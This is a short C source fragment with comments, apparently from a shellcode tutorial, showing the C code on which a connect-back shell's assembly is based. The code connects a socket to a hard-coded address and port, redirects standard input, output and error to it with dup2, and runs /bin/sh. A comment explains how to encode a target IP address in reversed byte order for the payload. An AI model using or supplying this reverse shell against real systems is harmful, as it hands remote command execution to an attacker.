//su-2.05a# perl -e 'printf "0x" . "%02x"x4 ."\n",33,12,6,10'
//0x210c060a
//Just make sure you reverse the IP address like I did with 10.6.12.33. The C code on which the
//assembly is based:
#include<unistd.h>
#include<sys/socket.h>
#include<netinet/in.h>

int soc,rc;
struct sockaddr_in serv_addr;

int main()
{

                serv_addr.sin_family=2;
                serv_addr.sin_addr.s_addr=0x0100007f;
                serv_addr.sin_port=0xAAAA; /* port 43690 */
                soc=socket(2,1,6);
                rc = connect(soc, (struct sockaddr *)&serv_addr,0x10);
                dup2(soc,0);
                dup2(soc,1);
                dup2(soc,2);
                execle("/bin/sh",0,0);
}
